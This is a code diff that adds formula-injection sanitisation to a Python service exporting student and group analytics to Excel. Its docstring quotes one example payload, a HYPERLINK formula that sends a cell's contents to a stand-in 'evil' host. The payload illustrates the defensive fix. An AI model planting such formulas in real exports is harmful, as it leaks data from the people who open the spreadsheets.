@@ -11,6 +11,31 @@ from typing import List, Dict, Any, Optional
 from datetime import datetime
 from io import BytesIO
 
+# Characters that make Excel / LibreOffice treat a cell as a formula rather than text.
+# A leading tab or CR counts because the sheet strips it before evaluating.
+_FORMULA_SIGILS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def sanitize_spreadsheet_value(value):
+    """Neutralise spreadsheet formula injection in a single cell value.
+
+    Student names, group names and course titles are user- or staff-editable free text
+    that lands directly in exports. A value beginning with one of ``_FORMULA_SIGILS``
+    is executed on open, so ``=HYPERLINK("http://evil/?x="&A1,"Click")`` in a student's
+    name becomes a live exfiltration link in a curator's spreadsheet.
+
+    Prefixing with an apostrophe is the standard mitigation: Excel treats the cell as
+    literal text and does not display the apostrophe itself.
+
+    Non-strings (ints, floats, bools, dates, None) pass through untouched so numeric
+    cells stay numeric and remain aggregatable.
+    """
+    if not isinstance(value, str):
+        return value
+    if value.startswith(_FORMULA_SIGILS):
+        return "'" + value
+    return value
+
 
 class ExcelExportService:
     """Service for exporting analytics data to Excel with charts"""
@@ -130,7 +155,7 @@ class ExcelExportService:
             ]
             
             for col, value in enumerate(row_data, 1):
-                cell = ws.cell(row=idx, column=col, value=value)
+                cell = ws.cell(row=idx, column=col, value=sanitize_spreadsheet_value(value))
                 cell.alignment = Alignment(horizontal='center', vertical='center')
                 
                 # Conditional formatting for progress
@@ -206,8 +231,8 @@ class ExcelExportService:
         ]
         
         for idx, (label, value) in enumerate(overview_data, 3):
-            label_cell = ws.cell(row=idx, column=1, value=label)
-            value_cell = ws.cell(row=idx, column=2, value=value)
+            label_cell = ws.cell(row=idx, column=1, value=sanitize_spreadsheet_value(label))
+            value_cell = ws.cell(row=idx, column=2, value=sanitize_spreadsheet_value(value))
             
             if label and not value:  # Section headers
                 label_cell.font = Font(bold=True, size=12)
@@ -266,7 +291,7 @@ class ExcelExportService:
             ]
             
             for col, value in enumerate(row_data, 1):
-                cell = ws.cell(row=idx, column=col, value=value)
+                cell = ws.cell(row=idx, column=col, value=sanitize_spreadsheet_value(value))
                 cell.alignment = Alignment(horizontal='center', vertical='center')
                 
                 if col == 3:  # Progress %
@@ -376,7 +401,8 @@ class ExcelExportService:
         
         data_start = start_row + 1
         for idx, student in enumerate(sorted_students, data_start):
-            ws.cell(row=idx, column=1, value=student.get('student_name', 'N/A'))
+            ws.cell(row=idx, column=1,
+                    value=sanitize_spreadsheet_value(student.get('student_name', 'N/A')))
             ws.cell(row=idx, column=2, value=student.get('progress_percentage', 0))
         
         # Create chart
@@ -411,7 +437,8 @@ class ExcelExportService:
         
         data_start = start_row + 1
         for idx, group in enumerate(groups_data, data_start):
-            ws.cell(row=idx, column=1, value=group.get('group_name', 'N/A'))
+            ws.cell(row=idx, column=1,
+                    value=sanitize_spreadsheet_value(group.get('group_name', 'N/A')))
             ws.cell(row=idx, column=2, value=group.get('average_progress', 0))
         
         # Create chart
@@ -514,7 +541,7 @@ class ExcelExportService:
                 score,
             ]
             for col, value in enumerate(row_data, 1):
-                cell = ws.cell(row=idx, column=col, value=value)
+                cell = ws.cell(row=idx, column=col, value=sanitize_spreadsheet_value(value))
                 cell.alignment = Alignment(horizontal='center', vertical='center')
                 if col == 14:  # Activity Score
                     cell.font = Font(bold=True)
@@ -571,7 +598,7 @@ class ExcelExportService:
                 r.get('on_time', 0),
             ]
             for col, value in enumerate(row_data, 1):
-                cell = ws.cell(row=idx, column=col, value=value)
+                cell = ws.cell(row=idx, column=col, value=sanitize_spreadsheet_value(value))
                 cell.alignment = Alignment(horizontal='center', vertical='center')
 
         ws.freeze_panes = 'A3'
